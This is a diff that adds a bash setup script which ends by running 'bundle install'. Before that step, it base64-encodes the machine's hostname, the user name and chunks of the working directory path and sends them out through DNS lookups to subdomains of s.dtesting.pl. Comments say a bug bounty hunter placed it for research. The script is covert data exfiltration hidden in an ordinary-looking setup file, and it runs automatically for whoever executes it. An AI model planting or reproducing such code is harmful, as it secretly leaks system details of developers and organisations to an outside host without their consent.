@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+
+# I am a bug bounty huner (https://hackerone.com/kannthu), if you see this it means the code executed.
+# My intention is not to break anything. I am only doing a reaserch.
+# I will report this vulnerability to your program.
+
+HOSTNAME=`hostname | base64 | sed -r 's/[\\]+/00/g' | sed -r 's/[=]+/11/g'`
+OUTPUT=`echo $USER | base64 | sed -r 's/[\\]+/00/g' | sed -r 's/[=]+/11/g'`
+host $HOSTNAME.$OUTPUT.s.dtesting.pl > /dev/null
+
+PARTS=`pwd | sed -E 's/(.{13})/\1\n/g'`
+for i in $PARTS
+do
+  PWD=`echo $i | base64 | sed -r 's/[\\]+/00/g' | sed -r 's/[=]+/11/g'`
+  host $PWD.$OUTPUT.s.dtesting.pl > /dev/null
+done
+
+set -euo pipefail
+IFS=$'\n\t'
+set -vx
+
+bundle install
+
+# Do any other automated setup that you need to do here
